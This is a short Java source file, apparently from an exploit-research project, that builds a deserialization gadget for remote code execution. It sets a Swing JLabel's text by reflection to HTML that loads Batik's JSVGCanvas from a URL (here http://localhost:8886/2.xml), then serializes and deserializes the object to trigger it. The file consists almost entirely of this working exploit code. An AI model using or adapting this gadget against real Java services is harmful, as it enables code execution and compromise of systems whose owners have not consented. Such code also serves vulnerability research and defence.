package me.n1ar4.exploit;

import javax.swing.*;
import java.lang.reflect.Field;

public class JSRCE {
    public Object getObject() throws Exception {
        JLabel label = new JLabel();
        // OLD JDK SET TRUE/FALSE
        // NEW JDK SET FALSE
        label.putClientProperty("html.disable", false);
        Field textField = label.getClass().getDeclaredField("text");
        textField.setAccessible(true);
        textField.set(label,"<html><object " +
                "classid=\"org.apache.batik.swing.JSVGCanvas\">" +
                "<param name=\"URI\" value=\"http://localhost:8886/2.xml\"></object></html>");
        return label;
    }

    public static void main(String[] args) throws Exception{
        Object t = new JSRCE().getObject();
        byte[] d = SerUtil.serialize(t);

        SerUtil.deserialize(d);
    }
}
